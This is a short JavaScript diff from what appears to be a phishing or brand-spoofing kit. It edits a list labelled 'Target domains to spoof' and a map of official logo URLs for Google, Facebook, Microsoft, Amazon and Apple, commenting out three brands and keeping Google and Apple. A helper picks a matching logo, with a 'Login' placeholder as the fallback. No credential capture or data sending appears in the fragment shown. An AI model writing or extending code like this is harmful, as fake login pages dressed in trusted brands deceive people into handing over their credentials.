@@ -135,18 +135,18 @@
     // Target domains to spoof (pick one randomly)
     const targetDomains = [
         'https://www.google.com',
-        'https://www.facebook.com',
-        'https://www.microsoft.com',
-        'https://www.amazon.com',
+        //'https://www.facebook.com',
+        //'https://www.microsoft.com',
+        //'https://www.amazon.com',
         'https://www.apple.com'
     ];
     
     // Logo URLs for different brands
     const brandLogos = {
         'google': 'https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png',
-        'facebook': 'https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg',
-        'microsoft': 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b',
-        'amazon': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg',
+        //'facebook': 'https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg',
+        //'microsoft': 'https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b',
+        //'amazon': 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg',
         'apple': 'https://www.apple.com/ac/structured-data/images/knowledge_graph_logo.png'
     };
     
@@ -156,9 +156,9 @@
     
     function getBrandLogo(url) {
         if (url.includes('google')) return brandLogos.google;
-        if (url.includes('facebook')) return brandLogos.facebook;
-        if (url.includes('microsoft')) return brandLogos.microsoft;
-        if (url.includes('amazon')) return brandLogos.amazon;
+      //  if (url.includes('facebook')) return brandLogos.facebook;
+    //    if (url.includes('microsoft')) return brandLogos.microsoft;
+      //  if (url.includes('amazon')) return brandLogos.amazon;
         if (url.includes('apple')) return brandLogos.apple;
         return 'https://via.placeholder.com/120x40/1877f2/ffffff?text=Login';
     }
